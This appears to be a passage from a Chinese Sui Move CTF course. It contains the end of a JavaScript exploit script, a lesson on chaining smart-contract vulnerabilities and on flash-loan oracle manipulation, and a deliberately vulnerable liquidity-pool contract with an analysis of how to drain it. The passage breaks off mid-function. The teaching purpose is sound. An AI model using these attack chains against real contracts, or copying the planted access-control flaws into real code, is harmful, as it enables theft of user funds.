        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest, 
                {showInput: false,showRawInput: false,showEffects: false,showEvents: true, showObjectChanges: false,showBalanceChanges: false}
            ]
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        const events = response.data.result?.events;
        if (events &amp;&amp; events.length &gt; 0) {
            console.log('交易触发的事件列表:');
            let amount = null;
            for (const event of events){
                if (event.parsedJson &amp;&amp; 'amount' in event.parsedJson) {
                    amount = parseInt(event.parsedJson.amount, 10); 
                    console.log('Amount:', amount);
                    break;
                }else{
                    console.log('事件内容:', event.parsedJson);
                }
            }
            return amount;
        } else {
            console.log('该交易没有触发任何事件。');
            return 0;
        }

    } catch (error) {
        console.error('获取交易事件失败:', error.message);
        return 0;
    }
}

async function get_newly_created_object(digest) {
    try {
        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest,
                {
                    showEffects: true,
                    showObjectChanges: true
                }
            ]
        }, {
            headers: { 'Content-Type': 'application/json' }
        });
        const result = response.data.result;
        const createdObjects = result.effects?.created || [];
        if (createdObjects.length === 0) {
            console.log('未找到新创建的对象');
            return null;
        }

        const newObjectId = createdObjects[0].reference.objectId;
        console.log('新对象 ID:', newObjectId);
        return newObjectId;

    } catch (error) {
        console.error('获取新对象失败:', error.message);
        return null;
    }
}
// 升级英雄
let i = 0;
while(i&lt;200){
    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::adventure::slay_boar`,
        arguments: [
            tx.object(heroId),
            ]
        });
    let experience = await get_experience();
    console.log("experience: ",experience);
    if (experience &gt;= 100){
        tx.moveCall({
            target: `${PACKAGE_ID}::hero::level_up`,
            arguments: [tx.object(heroId),]
        });
        const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
        console.log('Transaction Result:', result);
        break;
    }
    const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
    console.log('Transaction Result:', result);
}
// 初始化balances
const tx1 = new Transaction();
tx1.moveCall({
            target: `${PACKAGE_ID}::adventure::init_balances`,
            arguments: [tx1.object(userTokenAmountId),]
        });
const result1 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx1,});
console.log('Transaction Result:', result1);
// 打野猪王获取balances
while(true){
      try{
        const tx3 = new Transaction();
        let num = 2047;
        const address1 = ''// 随便写一个地址
        tx3.moveCall({
                target: `${PACKAGE_ID}::adventure::new_obj`,
                arguments: [tx3.pure.u64(num), tx3.pure.address(address1),]
            });
        tx3.moveCall({
                target: `${PACKAGE_ID}::adventure::slay_boar_king`,
                arguments: [tx3.object('0x6'), tx3.object(userTokenAmountId), tx3.object(heroId)]
            });
        const result3 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx3,});
        console.log('Transaction Result:', result3);
        let amount = await get_transaction_events(result3.digest);
        // console.log("amount: ",amount);
        if (amount &gt;= 200) {
            break;
        }else{
            continue;
        }
     }catch(error){
         console.log("error");
         continue;
     }
}
// buy box
const tx4 = new Transaction();
tx4.moveCall({
            target: `${PACKAGE_ID}::adventure::buy_box`,
            arguments: [tx4.object(userTokenAmountId),]
        });
const result4 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx4,});
console.log('Transaction Result:', result4);
let newobjectId = await get_newly_created_object(result4.digest);
if (newobjectId != null){
    // get flag
    const tx5 = new Transaction();
    tx5.moveCall({
                target: `${PACKAGE_ID}::inventory::get_flag`,
                arguments: [tx5.object(newobjectId),]
            });
    const result5 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx5,});
    console.log('Transaction Result:', result5);
   await get_transaction_events(result5.digest);

}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第8节综合ctf挑战"><a class="header" href="#第8节综合ctf挑战">第8节：综合CTF挑战</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第8节综合ctf挑战-1"><a class="header" href="#第8节综合ctf挑战-1">第8节：综合CTF挑战</a></h1>
<p>欢迎来到Move CTF挑战课程的最后一节！通过前面的课程学习，你已经掌握了Sui Move CTF中会遇到的大部分漏洞类型，从代码层面的细节到架构层面的风险。你学会了识别泛型安全问题、如何绕过权限控制、利用逻辑漏洞，也理解了资源所有权和跨合约交互的陷阱等。</p>
<p>然而，在高水平的CTF挑战或真实世界的攻击中，漏洞往往不是孤立存在的。攻击者很少能通过一个简单的bug就直接得手。真正的挑战在于<strong>发现多个“小”漏洞，并将它们像拼图一样组合起来，构建出一条完整的、能够达成最终目标的攻击链</strong>。</p>
<p>本节课的目标不是解决某一个具体的题目，而是为你提供一个<strong>解题框架和思维模型</strong>，教你如何：</p>
<ol>
<li>像攻击者一样思考，从最终目标倒推攻击路径。</li>
<li>识别并将不同类型的漏洞串联起来，形成组合拳。</li>
<li>理解DeFi领域的经典攻击如何在Sui CTF中得到体现。</li>
<li>掌握解决复杂综合性问题的通用方法论。</li>
</ol>
<hr />
<h3 id="一-攻击链思维从单点突破到组合利用"><a class="header" href="#一-攻击链思维从单点突破到组合利用"><strong>一、 攻击链思维：从“单点突破”到“组合利用”</strong></a></h3>
<p>综合性挑战的核心是从“找到一个漏洞”转变为“规划一条攻击路径”。</p>
<p>想象一个多重门锁的保险库：</p>
<ul>
<li><strong>第一道门（权限入口）</strong>：可能是需要一个特殊的身份凭证。</li>
<li><strong>第二道门（业务逻辑）</strong>：可能需要满足某个特定的业务状态。</li>
<li><strong>第三道门（执行环节）</strong>：可能是调用一个有风险的内部函数。</li>
</ul>
<p>你找到的每一个漏洞，都只是打开其中一道门的钥匙。你的任务是找到所有钥匙，并按正确的顺序使用它们。</p>
<p><strong>一个典型的攻击链可能如下：</strong></p>
<p><code>漏洞A (初始入口)</code> -&gt; <code>获得某种权限或状态</code> -&gt; <code>利用新权限触发漏洞B (中间环节)</code> -&gt; <code>改变关键状态或绕过检查</code> -&gt; <code>触发漏洞C (最终执行)</code> -&gt; <code>达成目标（如盗取资金）</code></p>
<hr />
<h3 id="二-常见综合攻击模式与真实世界映射"><a class="header" href="#二-常见综合攻击模式与真实世界映射"><strong>二、 常见综合攻击模式与真实世界映射</strong></a></h3>
<p>很多CTF题目往往会结合前面我们学习到的多个漏洞，并且可能结合常见的Defi经济模型和真实的攻击案例，让我们回顾前几节课的知识，看看它们如何组合成强大的攻击模式，并与DeFi世界的真实攻击联系起来。</p>
<h4 id="模式1泛型安全漏洞--逻辑漏洞"><a class="header" href="#模式1泛型安全漏洞--逻辑漏洞"><strong>模式1：泛型安全漏洞 + 逻辑漏洞</strong></a></h4>
<ul>
<li><strong>漏洞组合</strong>：
<ol>
<li><strong>泛型类型安全漏洞</strong>：允许攻击者创建自定义的、非官方的虚假“凭证”对象（如伪造的投票凭证、会员卡）。</li>
<li><strong>状态管理逻辑漏洞</strong>：业务逻辑（如投票、领取空投）只检查凭证的存在或ID，而不验证其真实类型或来源，并且允许重复操作。</li>
</ol>
</li>
<li><strong>攻击流程</strong>：
<ol>
<li>攻击者利用泛型漏洞，在一个交易中创建大量伪造的凭证对象。</li>
<li>利用逻辑漏洞，使用这些伪造凭证重复执行某个有利可图的操作（如为自己的恶意提案投票、重复领取奖励）。</li>
</ol>
</li>
<li><strong>真实世界映射</strong>：这类似于在去中心化治理（DAO）中，攻击者通过漏洞凭空创造出大量投票权，然后通过一个看似“合法”的提案，将资金库或协议中的资金转移给自己。</li>
</ul>
<h4 id="模式2权限绕过--跨合约交互安全漏洞"><a class="header" href="#模式2权限绕过--跨合约交互安全漏洞"><strong>模式2：权限绕过 + 跨合约交互安全漏洞</strong></a></h4>
<ul>
<li>
<p><strong>漏洞组合</strong>：</p>
<ol>
<li><strong>权限与访问控制漏洞</strong>：合约中某个强大的<code>Public</code>函数（例如 <code>execute_proposal</code>）的触发条件存在缺陷。例如，它需要提案获得足够的票数，但投票机制本身可以被操纵（如模式1所述）。</li>
<li><strong>跨合约交互安全漏洞</strong>：该函数被设计成一个“指令执行器”。它会获取用户提供的数据参数（例如，一个<code>Proposal</code>对象中的目标模块地址、函数名、参数），并基于这些数据参数在同一个交易中构造并执行一个跨模块调用。</li>
</ol>
</li>
<li>
<p><strong>攻击流程</strong>：</p>
<ol>
<li>攻击者找到一个能够执行任意调用的函数。这个函数本身就是一个“指令执行器”。</li>
<li>攻击者精心构造一份“指令集”（例如，创建一个提案），将目标指向一个存有资金的合约（如 <code>Treasury</code> ），指令内容是调用该合约的 <code>withdraw</code> 函数，并将资金转到攻击者地址。</li>
<li>攻击者通过另一个漏洞（如模式1的漏洞）或其他逻辑漏洞，满足了调用这个“指令执行器”函数的前提条件。</li>
<li>当函数被调用时，拥有<code>Treasury</code>对象所有权或访问权的DAO合约，会代表攻击者去执行提款的操作。攻击者本人从未直接获得<code>&amp;mut Treasury</code>，但他成功地让DAO合约为他调用了需要该权限的函数。</li>
</ol>
</li>
<li>
<p><strong>真实世界映射</strong>：
这个模式是对<strong>智能合约作为可信中介</strong>的信任滥用。</p>
<ul>
<li>可以把<code>DAO</code>合约想象成一个由社区管理的<strong>智能合约金库</strong>或一个<strong>去中心化基金会</strong>。它被设计用来保管核心资产（<code>Treasury</code>对象），并只根据一套严格的治理规则（提案和投票系统）来动用这些资产。</li>
<li><code>Treasury</code>对象就是被安全地锁在这个金库里的<strong>社区资产</strong>。</li>
<li>攻击者并未试图直接撬开金库的锁（即绕过<code>Treasury</code>对象的所有权规则），这是Sui的对象模型所极力防止的。</li>
<li>相反，攻击者攻击的是<strong>金库的管理模式</strong>（即提案投票逻辑）。通过利用管理模式的漏洞，攻击者伪造了一份看起来完全合规的“提款申请”（一个被恶意投票通过的提案）。</li>
<li>金库合约，作为一个规则执行者，在验证到“提款申请”符合所有程序后，便会<strong>误用自己的合法权限</strong>，亲自打开金库，将资产转移给攻击者。</li>
</ul>
</li>
</ul>
<h4 id="模式3defi模型利用"><a class="header" href="#模式3defi模型利用"><strong>模式3：Defi模型利用</strong></a></h4>
<p>很多CTF的出题方式会以Defi为基础模型（例如AMM，Lending），漏洞往往不是前面提到的一些通用类型漏洞，而是经济模型的缺陷，这需要我们去了解更多的Defi知识和Defi中常见的攻击方式。</p>
<ul>
<li><strong>攻击场景：价格预言机操纵</strong>
<ul>
<li><strong>背景</strong>：一个借贷协议使用某个去中心化交易所（DEX）的交易对价格作为预言机，来计算抵押品的价值。</li>
<li><strong>漏洞组合</strong>：
<ol>
<li><strong>闪电贷</strong>：攻击者从Lending协议中利用闪电贷借出巨额资金（例如100万SUI），无需抵押，只需在同一个交易内归还。</li>
<li><strong>不稳定的价格预言机</strong>：DEX的价格会因为一笔大额交易而产生巨大滑点。</li>
</ol>
</li>
<li><strong>攻击流程</strong>：
<ol>
<li>创建一个原子交易。</li>
<li>通过闪电贷借入大量SUI。</li>
<li>在作为预言机的DEX中，用借来的SUI大量买入某种代币X，瞬间拉高X的价格。</li>
<li>在目标借贷协议中，以被拉高了数倍的价格抵押少量代币X，借出远超其真实价值的SUI。</li>
<li>在DEX中卖掉代币X，将价格恢复原状。</li>
<li>归还闪电贷，带着借出的超额SUI离场。</li>
</ol>
</li>
<li><strong>CTF体现</strong>：题目会提供一个闪电贷协议、一个DEX和一个借贷合约。你需要编写一个<code>exploit</code>函数，在一个交易中完成上述所有步骤。</li>
</ul>
</li>
</ul>
<hr />
<h3 id="三-解决综合性挑战的战略框架"><a class="header" href="#三-解决综合性挑战的战略框架"><strong>三、 解决综合性挑战的战略框架</strong></a></h3>
<p>当你面对一个复杂的CTF题目时，不要一头扎进代码里。遵循以下步骤：</p>
<p><strong>Step 1：目标侦察</strong></p>
<ul>
<li><strong>确定获取flag的条件</strong>：<code>is_solved()</code>函数如何变为<code>true</code>？目标是清空某个金库的余额吗？还是将自己的地址变为<code>owner</code>？<strong>清晰的目标是所有行动的起点。</strong></li>
<li><strong>识别核心资产与高权限函数</strong>：找到存储资金的<code>Balance</code>或<code>Coin</code>对象。找到那些看起来最危险的函数，如<code>withdraw</code>, <code>execute</code>, <code>migrate</code>, <code>set_admin</code>等。这些是你的最终攻击目标。</li>
</ul>
<p><strong>Step 2：漏洞分析</strong></p>
<ul>
<li><strong>系统性审计</strong>：带着前几节课的清单，逐一检查所有合约：
<ul>
<li>函数中有没有泛型 <code>T</code> 却没有做类型限制？</li>
<li>涉及权限的操作，是否严格验证了<code>tx_context::sender</code>？</li>
<li>数学计算是否存在溢出或精度损失风险？</li>
<li>对象的所有权和共享属性是否合理？</li>
</ul>
</li>
<li><strong>寻找你的“第一把钥匙”</strong>：找到最容易利用的那个漏洞，作为你攻击链的起点。也许你不能直接用它偷钱，但它可能让你获得一个之前没有的“身份”或“能力”。</li>
</ul>
<p><strong>Step 3：攻击路径规划与攻击链构建</strong></p>
<ul>
<li><strong>正向推导</strong>：从你的立足点开始，“我现在能创建伪造的NFT了，有了这个NFT，我能调用哪个新函数？哦，可以调用<code>propose</code>。提案能做什么？能指定任意调用……”</li>
<li><strong>反向推导</strong>：从最终目标开始，“我要调用<code>withdraw</code>，需要<code>&amp;mut Treasury</code>。谁能给我这个引用？<code>execute_proposal</code>函数可以。要执行提案，需要100个投票。我如何获得100个投票？……”</li>
<li><strong>绘制攻击图</strong>：将合约、函数、状态和漏洞作为节点，用线连接它们，直到从你的起点（初始漏洞）到终点（目标达成）有一条清晰的路径。</li>
</ul>
<p><strong>Step 4：Exp编写</strong></p>
<ul>
<li><strong>编写<code>exploit</code>模块</strong>：在CTF中，通常需要你编写一个<code>exploit.move</code>文件。将你的攻击逻辑封装在一个<code>attack</code>函数中，清晰地展示你的攻击步骤。</li>
</ul>
<hr />
<h3 id="结语"><a class="header" href="#结语"><strong>结语</strong></a></h3>
<p>恭喜你完成了整个Sui Move CTF课程！安全是一个永无止境的攻防游戏，技术的更新迭代会带来新的攻击面。但今天你在这里学到的Move CTF挑战课程，将是你未来应对任何未知挑战的基石。</p>
<p>真正的学习始于课程结束之后。去挑战真实的CTF比赛，去审计开源项目，去不断地实践和思考。祝你在Web3的安全世界中，既能成为坚不可摧的建设者，也能成为洞察一切的智者。旅途愉快！</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践多步骤综合挑战"><a class="header" href="#实践多步骤综合挑战">实践：多步骤综合挑战</a></h1>
<h2 id="题目描述-3"><a class="header" href="#题目描述-3">题目描述</a></h2>
<p>在本次Sui Move CTF课程的最后，你将结合前面学习到的内容尝试破解一个综合多个漏洞的CTF题目。你面对一个 Sui Move 实现的流动性池合约，合约允许用户在两组代币对之间进行兑换（swap），并收取一定手续费。你的目标是通过分析合约逻辑，结合前面学习到的漏洞，利用合约提供的swap函数，最终让合约中所有代币余额与累计手续费之和为零（即所有资产被偷走），从而通过 <code>is_solved</code> 函数获得 flag。flag 会以事件形式输出，格式为 CTF{xxx}。</p>
<h2 id="示例代码-3"><a class="header" href="#示例代码-3">示例代码</a></h2>
<p>以下是本次CTF task8题目的代码：</p>
<pre><code class="language-move">
module task8::token1 {
    use sui::coin;
    public struct TOKEN1 has drop {}

    fun init(witness: TOKEN1, ctx: &amp;mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token1", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token2 {
    use sui::coin;
    public struct TOKEN2 has drop {}

    fun init(witness: TOKEN2, ctx: &amp;mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token2", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token3 {
    use sui::coin;
    public struct TOKEN3 has drop {}

    fun init(witness: TOKEN3, ctx: &amp;mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token3", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token4 {
    use sui::coin;
    public struct TOKEN4 has drop {}

    fun init(witness: TOKEN4, ctx: &amp;mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token4", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::pool {
    use sui::coin::{Self, Coin};
    use task8::token1::{TOKEN1};
    use task8::token2::{TOKEN2};
    use task8::token3::{TOKEN3};
    use task8::token4::{TOKEN4};

    use sui::bag::{Self, Bag};
    use std::type_name::{Self, TypeName};
    use std::ascii::String;
    use std::ascii::{Self};


    use sui::balance::{Self, Balance};
    use sui::event;

    public struct AdminCap has key { id: UID }

    public struct Pools has key, store {
        id: UID,
        balance_bag: Bag,
        pool_bag: Bag,       
        fee_manager: address,
        cap_bag: Bag,
        free_mint: bool, 
    }

    public struct Pool has store, drop {
        token_1: TypeName,
        token_2: TypeName,
        reserve_1: u64,
        reserve_2: u64,
        fee: u64,
        fee_amount_1: u64,
        fee_amount_2: u64,
    }

    public struct PoolCap&lt;phantom X, phantom Y&gt; has key, store { 
        id: UID,
    }

    public struct Flag has copy, drop {
        user: address,
    }

    // init for admin
    fun init(ctx: &amp;mut TxContext) {
        transfer::transfer(AdminCap {
            id: object::new(ctx)
        }, tx_context::sender(ctx));

        transfer::share_object(Pools {
            id: object::new(ctx),
            balance_bag: bag::new(ctx),
            pool_bag: bag::new(ctx),
            fee_manager: tx_context::sender(ctx),
            cap_bag: bag::new(ctx),
            free_mint: false
        });
    }

    public fun get_token&lt;T&gt;(pools: &amp;mut Pools): &amp;mut Balance&lt;T&gt; {
        let type_name = type_name::into_string(type_name::get&lt;T&gt;());
        if (!pools.balance_bag.contains(type_name)) {
            pools.balance_bag.add(type_name, balance::zero&lt;T&gt;());
        };
        &amp;mut pools.balance_bag[type_name]
    }

    fun get_balance&lt;T&gt;(pools: &amp;mut Pools): u64 {
        balance::value&lt;T&gt;(get_token(pools))
    }
    
    fun get_total_fee&lt;X, Y&gt;(pools: &amp;mut Pools): u64 {
        get_pool&lt;X, Y&gt;(pools).fee_amount_1 + get_pool&lt;X, Y&gt;(pools).fee_amount_2
    }


    fun get_fee&lt;X, Y&gt;(pools: &amp;mut Pools): u64 {
        get_pool&lt;X, Y&gt;(pools).fee
    }

    fun get_struct&lt;X&gt;(): String {
        let type_name = type_name::get&lt;X&gt;();
        let address_part = type_name.get_address().length();
        let module_part = type_name.get_module().length();
        let full = type_name.borrow_string().length();
        type_name.borrow_string().substring(address_part + module_part + 4, full)
    }

    fun get_pool_k&lt;X, Y&gt;(): String {
        let mut pool_k = get_struct&lt;X&gt;();
        ascii::append(&amp;mut pool_k, get_struct&lt;Y&gt;());
        pool_k
    }

    public fun get_pool&lt;X, Y&gt;(pools: &amp;mut Pools): &amp;mut Pool {
        let pool = pools.pool_bag.borrow_mut&lt;String, Pool&gt;(
            get_pool_k&lt;X, Y&gt;(),
        );
        pool
    }


    ///////// admin functions
    public entry fun set_fee_manager(pools: &amp;mut Pools, new_fee_manager: address, ctx: &amp;mut TxContext) {
        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
        pools.fee_manager = new_fee_manager;
    }

    public fun create_pool&lt;X, Y&gt;(pools: &amp;mut Pools, fee: u64, token1: Coin&lt;X&gt;, token2: Coin&lt;Y&gt;, ctx: &amp;mut TxContext): PoolCap&lt;X, Y&gt; {
        let add1 = token1.value();
        let add2 = token2.value();
        balance::join(get_token&lt;X&gt;(pools), coin::into_balance(token1));
        balance::join(get_token&lt;Y&gt;(pools), coin::into_balance(token2));

        let pool = Pool {
            token_1: type_name::get&lt;X&gt;(),
            token_2: type_name::get&lt;Y&gt;(),
            reserve_1: add1,
            reserve_2: add2,

            fee,
            fee_amount_1: 0,
            fee_amount_2: 0,
        };
        if (!pools.pool_bag.contains(get_pool_k&lt;X, Y&gt;())) {
        pools.pool_bag.add(
            get_pool_k&lt;X, Y&gt;(),
            pool
        );
        };

        PoolCap&lt;X, Y&gt; {
            id: object::new(ctx)
        }
    }

    public fun claim_fees&lt;X, Y&gt;(pools: &amp;mut Pools, _pool_cap: &amp;mut PoolCap&lt;X, Y&gt;, ctx: &amp;mut TxContext): (Coin&lt;X&gt;, Coin&lt;Y&gt;) {
        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
        let fee_1 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_1 &gt; get_balance&lt;X&gt;(pools)) {
            get_balance&lt;X&gt;(pools)

        } else {
            get_pool&lt;X, Y&gt;(pools).fee_amount_1
        };
        let fee_2 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_2 &gt; get_balance&lt;Y&gt;(pools)) {
            get_balance&lt;Y&gt;(pools)

        } else {
            get_pool&lt;X, Y&gt;(pools).fee_amount_2
        };
        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = 0;
        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = 0;
        (
            coin::from_balance(balance::split(get_token&lt;X&gt;(pools), fee_1), ctx),
            coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), fee_2), ctx)
        )

    }

    public entry fun init_pools(_cap: &amp;mut AdminCap, pools: &amp;mut Pools, token1: Coin&lt;TOKEN1&gt;, token2: Coin&lt;TOKEN2&gt;, token3: Coin&lt;TOKEN3&gt;, token4: Coin&lt;TOKEN4&gt;, ctx: &amp;mut TxContext) {
        let cap1 = create_pool&lt;TOKEN1, TOKEN2&gt;(pools, 2, token1, token2, ctx);
        let cap2 = create_pool&lt;TOKEN3, TOKEN4&gt;(pools, 2, token3, token4, ctx);
        pools.cap_bag.add(
            get_pool_k&lt;TOKEN1, TOKEN2&gt;(),
            cap1
        );
        pools.cap_bag.add(
            get_pool_k&lt;TOKEN3, TOKEN4&gt;(),
            cap2
        );
    }

    ///////// public functions
    public fun get_amount_out&lt;X, Y&gt;(pools: &amp;mut Pools, amount_in: u64, order: bool): (u64, u64) {
        let pool = get_pool&lt;X, Y&gt;(pools);

        let (reserve_in, reserve_out)  = 
            if (order) {
                (pool.reserve_1, pool.reserve_2)
            } else {
                (pool.reserve_2, pool.reserve_1)
            };

        let fees_amount = amount_in * get_fee&lt;X, Y&gt;(pools) / 100;
        let amount_in = amount_in - fees_amount;
        let amount_out = amount_in * reserve_out / (reserve_in + amount_in);
        (amount_out, fees_amount)
    }

    public fun swap_a_2_b&lt;X, Y&gt;(
        pools: &amp;mut Pools, from: &amp;mut Coin&lt;X&gt;, ctx: &amp;mut TxContext): Coin&lt;Y&gt; {
        let amount_in = from.value();
        let (mut amount_out, fee) = get_amount_out&lt;X, Y&gt;(
            pools,
            amount_in,
            true,
        );
        if (amount_out &gt; get_pool&lt;X, Y&gt;(pools).reserve_2) {
            amount_out = get_pool&lt;X, Y&gt;(pools).reserve_2;
        };

        if (amount_out &gt; get_balance&lt;Y&gt;(pools)) {
            amount_out = get_balance&lt;Y&gt;(pools)
        };

        let store = get_token&lt;X&gt;(pools);
        balance::join(store, coin::into_balance(
            coin::split(from, amount_in, ctx)
        ));
        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = get_pool&lt;X, Y&gt;(pools).fee_amount_1 + fee;
        get_pool&lt;X, Y&gt;(pools).reserve_1 = get_pool&lt;X, Y&gt;(pools).reserve_1 + amount_in - fee;
        get_pool&lt;X, Y&gt;(pools).reserve_2 = get_pool&lt;X, Y&gt;(pools).reserve_2 - amount_out;

        coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), amount_out), ctx)
    }

    public fun swap_b_2_a&lt;X, Y&gt;(
        pools: &amp;mut Pools, from: &amp;mut Coin&lt;Y&gt;, ctx: &amp;mut TxContext): Coin&lt;X&gt; {
        let amount_in = from.value();
        let (mut amount_out, fee) = get_amount_out&lt;X, Y&gt;(
            pools,
            amount_in,
            false
        ); 

        if (amount_out &gt; get_pool&lt;X, Y&gt;(pools).reserve_2) {
            amount_out = get_pool&lt;X, Y&gt;(pools).reserve_2;
        };

        if (amount_out &gt; get_balance&lt;X&gt;(pools)) {
            amount_out = get_balance&lt;X&gt;(pools)
        };

        let store = get_token&lt;Y&gt;(pools);
        balance::join(store, coin::into_balance(
            coin::split(from, amount_in, ctx)
        ));

        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = get_pool&lt;X, Y&gt;(pools).fee_amount_2 + fee;
        get_pool&lt;X, Y&gt;(pools).reserve_2 = get_pool&lt;X, Y&gt;(pools).reserve_2 + amount_in - fee;
        get_pool&lt;X, Y&gt;(pools).reserve_1 = get_pool&lt;X, Y&gt;(pools).reserve_1 - amount_out;


        coin::from_balance(balance::split(get_token&lt;X&gt;(pools), amount_out), ctx)
    }

    // check whether you can get the flag
    public entry fun is_solved(pools: &amp;mut Pools, ctx: &amp;mut TxContext) {
        let sum = get_balance&lt;TOKEN1&gt;(pools) + get_balance&lt;TOKEN2&gt;(pools) + get_balance&lt;TOKEN3&gt;(pools) + get_balance&lt;TOKEN4&gt;(pools);
        let fee_sum = get_total_fee&lt;TOKEN1, TOKEN2&gt;(pools) + get_total_fee&lt;TOKEN3, TOKEN4&gt;(pools);
        assert!(sum + fee_sum == 0, 0);
        event::emit(Flag { user: tx_context::sender(ctx) })
    }


    #[test_only]
    public fun init_for_testing(ctx: &amp;mut TxContext) {
        init(ctx); 
    }

}

</code></pre>
<h2 id="任务目标-2"><a class="header" href="#任务目标-2">任务目标</a></h2>
<p>理解代码，找到代码中隐藏的多个漏洞，构造攻击链，耗尽pool中的所有代币与手续费。</p>
<pre><code class="language-move">    public entry fun is_solved(pools: &amp;mut Pools, ctx: &amp;mut TxContext) {
        let sum = get_balance&lt;TOKEN1&gt;(pools) + get_balance&lt;TOKEN2&gt;(pools) + get_balance&lt;TOKEN3&gt;(pools) + get_balance&lt;TOKEN4&gt;(pools);
        let fee_sum = get_total_fee&lt;TOKEN1, TOKEN2&gt;(pools) + get_total_fee&lt;TOKEN3, TOKEN4&gt;(pools);
        assert!(sum + fee_sum == 0, 0);
        event::emit(Flag { user: tx_context::sender(ctx) })
    }
</code></pre>
<h2 id="题目中的漏洞-1"><a class="header" href="#题目中的漏洞-1">题目中的漏洞</a></h2>
<h3 id="漏洞1-权限控制漏洞"><a class="header" href="#漏洞1-权限控制漏洞">漏洞1. 权限控制漏洞</a></h3>
<p>设置费用管理者存在权限漏洞，函数中检查了<code>new_fee_manager</code>是否是<code>tx_context::sender</code>，正确的应该是检查<code>pools.fee_manager</code>是否是<code>pools.fee_manager</code>，这里的权限检查漏洞可以让我们直接成为pools费用管理者。</p>
<pre><code>    ///////// admin functions
    public entry fun set_fee_manager(pools: &amp;mut Pools, new_fee_manager: address, ctx: &amp;mut TxContext) {
        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
        pools.fee_manager = new_fee_manager;
    }
</code></pre>
<h3 id="漏洞2-权限检查绕过"><a class="header" href="#漏洞2-权限检查绕过">漏洞2. 权限检查绕过</a></h3>
<p><code>create_pool</code>函数没有权限控制，且没有对创建的pool进行重复性检查，意味着我们可以重复创建pool，拿到对应的X，Y pool的<code>PoolCap</code>。</p>
<pre><code class="language-move">    public fun create_pool&lt;X, Y&gt;(pools: &amp;mut Pools, fee: u64, token1: Coin&lt;X&gt;, token2: Coin&lt;Y&gt;, ctx: &amp;mut TxContext): PoolCap&lt;X, Y&gt; {
        let add1 = token1.value();
        let add2 = token2.value();
        balance::join(get_token&lt;X&gt;(pools), coin::into_balance(token1));
        balance::join(get_token&lt;Y&gt;(pools), coin::into_balance(token2));

        let pool = Pool {
            token_1: type_name::get&lt;X&gt;(),
            token_2: type_name::get&lt;Y&gt;(),
            reserve_1: add1,
            reserve_2: add2,

            fee,
            fee_amount_1: 0,
            fee_amount_2: 0,
        };
        if (!pools.pool_bag.contains(get_pool_k&lt;X, Y&gt;())) {
        pools.pool_bag.add(
            get_pool_k&lt;X, Y&gt;(),
            pool
        );
        };

        PoolCap&lt;X, Y&gt; {
            id: object::new(ctx)
        }
    }
</code></pre>
<h2 id="漏洞3-创建池期间使用的种子并不唯一"><a class="header" href="#漏洞3-创建池期间使用的种子并不唯一">漏洞3. 创建池期间使用的种子并不唯一</a></h2>
<p>合约中存储的pool key是根据X coin和Y coin的结构体名来生成，这意味着这里生成的种子并不唯一，可以通过使用同名的X coin 和Y coin，也就是伪造的coin来攻击</p>
<pre><code class="language-move">    fun get_struct&lt;X&gt;(): String {
        let type_name = type_name::get&lt;X&gt;();
        let address_part = type_name.get_address().length();
        let module_part = type_name.get_module().length();
        let full = type_name.borrow_string().length();
        type_name.borrow_string().substring(address_part + module_part + 4, full)
    }

    fun get_pool_k&lt;X, Y&gt;(): String {
        let mut pool_k = get_struct&lt;X&gt;();
        ascii::append(&amp;mut pool_k, get_struct&lt;Y&gt;());
        pool_k
    }

    public fun get_pool&lt;X, Y&gt;(pools: &amp;mut Pools): &amp;mut Pool {
        let pool = pools.pool_bag.borrow_mut&lt;String, Pool&gt;(
            get_pool_k&lt;X, Y&gt;(),
        );
        pool
    }
</code></pre>
<h2 id="攻击链构造"><a class="header" href="#攻击链构造">攻击链构造</a></h2>
<p>我们的目的是掏空pool的所有资金和手续费，我们可以通过漏洞1和漏洞2成为协议的费用管理者并且拿到<code>poolcap</code>，就能够提取协议的手续费。通过漏洞3可以通过伪造的Coin把协议的资金掏空。</p>
<pre><code class="language-move">    public fun claim_fees&lt;X, Y&gt;(pools: &amp;mut Pools, _pool_cap: &amp;mut PoolCap&lt;X, Y&gt;, ctx: &amp;mut TxContext): (Coin&lt;X&gt;, Coin&lt;Y&gt;) {
        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
